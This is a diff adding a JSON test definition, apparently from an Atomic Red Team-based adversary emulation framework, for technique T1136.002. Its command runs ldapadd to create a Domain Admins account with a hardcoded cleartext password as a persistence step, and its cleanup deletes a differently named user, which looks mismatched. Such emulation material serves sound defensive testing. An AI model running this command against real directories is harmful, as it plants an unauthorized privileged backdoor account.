@@ -1,0 +1,58 @@
+{
+    "name": "Active Directory Create Admin Account",
+    "description": "Use Admin Credentials to Create A Domain Admin Account ",
+    "supported_platforms": [
+        "linux"
+    ],
+    "dependency_executor_name": "sh",
+    "executor": {
+        "elevation_required": false,
+        "command": "echo \"dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: Atomic User\\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}\" > tempadmin.ldif\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\n",
+        "cleanup_command": "echo removing Atomic User (temporary user)\necho \"dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\\nchangetype: delete\" > deleteuser.ldif\nldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif\nrm deleteuser.ldif\nrm tempadmin.ldif\n",
+        "name": "sh",
+        "type": "Command Executor"
+    },
+    "id": "T1136.002",
+    "tactics": [
+        "Persistence"
+    ],
+    "technique": "Domain Account",
+    "source": "ART",
+    "uuid": "562aa072-524e-459a-ba2b-91f1afccf5ab",
+    "arguments": {
+        "domain": {
+            "description": "The domain to be tested",
+            "type": "string",
+            "default": "example"
+        },
+        "top_level_domain": {
+            "description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
+            "type": "string",
+            "default": "test"
+        },
+        "admin_user": {
+            "description": "username@domain of a user with admin privileges",
+            "type": "string",
+            "default": "admin@example.test"
+        },
+        "admin_password": {
+            "description": "password of the user with admin privileges referenced in admin_user",
+            "type": "string",
+            "default": "s3CurePssw0rD!"
+        },
+        "domain_controller": {
+            "description": "Name of the domain_controller machine, defined in etc/hosts",
+            "type": "string",
+            "default": "adVM"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available\n",
+            "prereq_command": "which ldapadd && which ldapmodify\n",
+            "get_prereq_command": "echo ldapadd or ldapmodify not found; exit 1\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
